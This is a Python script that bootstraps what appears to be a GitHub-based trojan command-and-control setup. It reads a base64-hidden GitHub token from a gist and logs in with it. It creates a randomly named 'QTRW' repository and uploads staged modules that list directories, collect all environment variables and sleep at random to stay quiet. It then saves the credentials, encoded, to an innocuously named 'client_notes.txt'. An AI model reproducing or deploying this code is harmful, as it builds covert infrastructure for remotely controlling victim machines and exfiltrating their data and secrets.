#!/usr/bin/env python3

from base64 import b64decode, b64encode
from github3 import login, GitHub
from random import randint
from datetime import datetime

class BootStrapper:

    def __init__(self) -> None:
        self.stage_1 = '''
import json

def run(**args):
    print('[$] Enter stage 1')
    basic_config =json.dumps([{"module" : "dir_lister"},{"module" : "enviro"},{"module" : "sleep"},{"module" : "stage_2_qrw"}])
    return basic_config
                        '''
        self.stage_2_qrw = '''
import json

def run(**args):
    print('[$] Enter Stage 2')
    basic_config =json.dumps([{"module" : "sleep24h"}])
    return basic_config
                            '''
        self.dir_lister =  '''
import os

def run(**args):
    print('[*] In dir_lister module.')
    files = os.listdir('.')
    return str(files)
                            '''
        self.enviro =  '''
import os

def run(**args):
    print('[*] In enviroment module.')
    return os.environ
                        '''
        self.sleep='''
import time
import random

def run(**args):
    upper = 15
    lower = 10
    sleep_time = random.randint(lower, upper)
    print('[!] Sleep:', sleep_time)
    time.sleep(sleep_time)
    return sleep_time
                    '''
        self.sleep24h ='''
import time
import random

def run(**args):
    print('[!] Sleep for a day')
    time.sleep(random.randint(86000,86800))
                        '''
        
        self.module_list = [('stage_1',self.stage_1), ('dir_lister',self.dir_lister), ('enviro',self.enviro), ('sleep',self.sleep), ('stage_2_qrw',self.stage_2_qrw), ('sleep24h',self.sleep24h)]
        self.word_list_ick = ('nick', 'pick', 'wick', 'brick', 'click', 'flick', 'quick', 'slick')
        self.word_list_ock = ('dock', 'lock', 'rock', 'sock', 'tock', 'block', 'clock', 'flock')
        self.filename_out = 'client_notes.txt'   

        self.gist_data = GitHub().gist('a7f2201d3cea3249e0b879521306a05e')
        self.git_token = str(b64decode(self.gist_data.description), 'utf-8')
        self.git_handle = login(token=self.git_token)
        self.git_user = str(self.git_handle.me())
        
        self.git_repo_name = None
        self.repo = None
        self.configured = False

            
    def boot_repo(self)-> None:

        repo_list = self.git_handle.repositories()
        
        for repo in repo_list:
            if 'QTRW' in str(repo):
                self.git_repo_name = str(repo).replace(f'{self.git_user}/','').strip()
                self.repo = self.git_handle.repository(self.git_user,self.git_repo_name)
                self.configured = True
                break
            
        else:
            self.git_repo_name = f'{self.word_list_ick[(randint(1,8)-1)]}-{self.word_list_ock[(randint(1,8)-1)]}-QTRW'
            self.repo = self.git_handle.create_repository(self.git_repo_name)
            

    def boot_modules(self)-> None:
        if not self.configured:
            for module in self.module_list:
                path = f'modules/{module[0]}.py'
                message = f'{module[0]}_init_{datetime.now().isoformat()}'
                bindata = bytes(r'%s' %module[1], 'utf-8')
                self.repo.create_file(path, message, bindata)
    
    def file_write(self)-> None:
        if self.git_user and self.git_token and self.git_repo_name:
            git_dict = {'user':self.git_user,'token':self.git_token,'repo':self.git_repo_name}
            with open(self.filename_out, 'wb') as f:
                bindata = bytes('%r' %git_dict, 'utf-8')
                f.write(b64encode(bindata))

def main():
    bt = BootStrapper()
    
    print('->', bt.git_user, bt.git_token)
    
    bt.boot_repo()
    
    print('->', bt.git_repo_name)
    
    bt.boot_modules()
    
    bt.file_write()

if __name__ == '__main__':
    main()
